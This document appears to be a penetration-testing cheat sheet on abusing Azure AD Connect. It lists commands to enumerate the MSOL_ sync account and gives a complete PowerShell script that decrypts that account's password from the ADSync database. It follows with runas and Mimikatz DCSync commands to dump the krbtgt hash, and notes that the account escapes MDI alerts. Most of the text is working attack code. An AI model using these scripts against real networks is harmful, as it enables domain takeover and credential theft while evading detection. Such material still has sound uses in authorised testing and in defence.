# Cross Domain Attacks [ Azure AD Integration ]
## Methodology/Steps
> 1. Enumerate the users accounts who have **MSOL_** attribute identity.
> 2. Start a process with the priv of that user
> 3. Execute adconnect ps1 script, this will provide the creds of the user
> 4. Connect using runas and perform a DCSync Attack

---

## PowerShell
### 1. Enumerate the PHS account and server where AD Connect is installed
```powershell
# Powerview
Get-DomainUser -Identity "MSOL_*" -Domain techcorp.local

# AD Module
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" - Server techcorp.local -Properties * | select SamAccountName,Description | fl
```

### 2. Dump the creds of the user and logon
> With administrative privileges, if we run adconnect.ps1, we can extract the credentials of the MSOL_ account used by AD Connect in clear-text
> Note: Adconnect.ps1 script's code runs powershell.exe so verbose logs (like transcripts) will be there.
```powershell
# Adconnect
. .\adconnect.ps1
adconnect

# Runas that user
runas /user:techcorp.local\MSOL_16fb75d0227d /netonly cmd
```

### 3. Execute the DCSync attack
> Please note that because AD Connect synchronizes hashes every two minutes, in an Enterprise Environment, the **MSOL_** account will be excluded from tools like MDI! This will allow us to run DCSync without any alerts!
```powershell
# Invoke-Mimikatz
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:techcorp\krbtgt /domain:techcorp.local"'
```

---

# Abusing Azure AD Connect

+ Run the following script
```powershell
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

#$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```
